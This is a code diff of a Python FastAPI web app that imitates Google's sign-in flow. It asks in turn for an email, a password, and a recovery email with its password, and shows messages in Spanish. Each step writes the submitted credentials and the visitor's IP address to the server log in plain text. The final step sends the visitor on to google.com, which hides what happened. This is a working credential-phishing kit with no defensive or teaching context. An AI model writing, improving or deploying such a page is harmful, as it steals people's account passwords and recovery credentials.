@@ -8,51 +8,104 @@ import uvicorn
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-app = FastAPI(title="Google Login Demo")
+app = FastAPI()
 templates = Jinja2Templates(directory="templates")
 
-# Шаг 1: Ввод email
-@app.get("/", response_class=HTMLResponse)
-async def login_page(request: Request):
-    return templates.TemplateResponse("email_step.html", {"request": request})
+VALID_ACCOUNTS = {
+    "test@gmail.com": "password123",
+    "usuario@gmail.com": "clave123",
+    "demo@gmail.com": "demo123"
+}
 
-# Обработка email и переход к паролю
-@app.post("/verify-email")
-async def verify_email(request: Request, email: str = Form(...)):
+@app.get("/", response_class=HTMLResponse)
+async def google_login(request: Request):
+    return templates.TemplateResponse("google_login.html", {"request": request})
+
+@app.post("/check-email")
+async def check_email(request: Request, email: str = Form(...)):
     client_host = request.client.host if request.client else "N/A"
-    logger.info(f"[1-EMAIL] IP: {client_host}, Email: '{email}'")
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    logger.info(f"[EMAIL_ATTEMPT] IP: {client_host}, Email: '{email}'")
+    
+    if email not in VALID_ACCOUNTS:
+        return templates.TemplateResponse("google_login.html", {
+            "request": request,
+            "error_message": "No se encontró la cuenta de Google"
+        })
+    
     response = RedirectResponse(url="/password", status_code=303)
     response.set_cookie(key="user_email", value=email)
     return response
 
-# Шаг 2: Ввод пароля
 @app.get("/password", response_class=HTMLResponse)
 async def password_page(request: Request):
-    email = request.cookies.get("user_email", "usuario@ejemplo.com")
-    return templates.TemplateResponse("password_step.html", {"request": request, "email": email})
+    email = request.cookies.get("user_email", "")
+    if not email or email not in VALID_ACCOUNTS:
+        return RedirectResponse(url="/", status_code=303)
+    
+    first_letter = email[0].upper() if email else "G"
+    colors = ["#4285F4", "#34A853", "#FBBC05", "#EA4335"]
+    color_index = ord(first_letter) % len(colors)
+    
+    return templates.TemplateResponse("password_step.html", {
+        "request": request,
+        "email": email,
+        "avatar_color": colors[color_index],
+        "first_letter": first_letter
+    })
 
-# Обработка пароля и переход к recovery email
-@app.post("/verify-password")
-async def verify_password(request: Request, password: str = Form(...)):
+@app.post("/check-password")
+async def check_password(request: Request, password: str = Form(...)):
     client_host = request.client.host if request.client else "N/A"
-    email = request.cookies.get("user_email", "Desconocido")
-    logger.info(f"[2-PASSWORD] IP: {client_host}, For: '{email}', Password: '{password}'")
+    email = request.cookies.get("user_email", "")
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    if not email or email not in VALID_ACCOUNTS:
+        return RedirectResponse(url="/", status_code=303)
+    
+    correct_password = VALID_ACCOUNTS[email]
+    
+    if password != correct_password:
+        first_letter = email[0].upper() if email else "G"
+        colors = ["#4285F4", "#34A853", "#FBBC05", "#EA4335"]
+        color_index = ord(first_letter) % len(colors)
+        
+        logger.info(f"[WRONG_PASSWORD] IP: {client_host}, Email: '{email}', Provided: '{password}', Correct: '{correct_password}'")
+        
+        return templates.TemplateResponse("password_step.html", {
+            "request": request,
+            "email": email,
+            "avatar_color": colors[color_index],
+            "first_letter": first_letter,
+            "error_message": "Contraseña incorrecta. Vuelve a intentarlo."
+        })
+    
+    logger.info(f"[CORRECT_PASSWORD] IP: {client_host}, Email: '{email}'")
     return RedirectResponse(url="/recovery", status_code=303)
 
-# Шаг 3: Ввод recovery email и его пароля
 @app.get("/recovery", response_class=HTMLResponse)
 async def recovery_page(request: Request):
-    email = request.cookies.get("user_email", "usuario@ejemplo.com")
-    return templates.TemplateResponse("recovery_step.html", {"request": request, "email": email})
+    email = request.cookies.get("user_email", "")
+    if not email or email not in VALID_ACCOUNTS:
+        return RedirectResponse(url="/", status_code=303)
+    
+    return templates.TemplateResponse("recovery_step.html", {
+        "request": request,
+        "email": email
+    })
 
-# Финальная обработка и "успешный" вход
-@app.post("/verify-recovery")
-async def verify_recovery(request: Request, recovery_email: str = Form(...), recovery_password: str = Form(...)):
+@app.post("/process-recovery")
+async def process_recovery(request: Request, recovery_email: str = Form(...), recovery_password: str = Form(...)):
     client_host = request.client.host if request.client else "N/A"
-    main_email = request.cookies.get("user_email", "Desconocido")
-    log_message = f"[3-RECOVERY] IP: {client_host}, Main: '{main_email}', Recovery Email: '{recovery_email}', Recovery Password: '{recovery_password}'"
-    logger.info(log_message)
-    return templates.TemplateResponse("final.html", {"request": request, "email": main_email})
+    email = request.cookies.get("user_email", "")
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    logger.info(f"[RECOVERY_DATA] IP: {client_host}, Main: '{email}', Recovery Email: '{recovery_email}', Recovery Password: '{recovery_password}'")
+    
+    response = RedirectResponse(url="https://www.google.com", status_code=307)
+    response.delete_cookie(key="user_email")
+    return response
 
 if __name__ == "__main__":
     uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
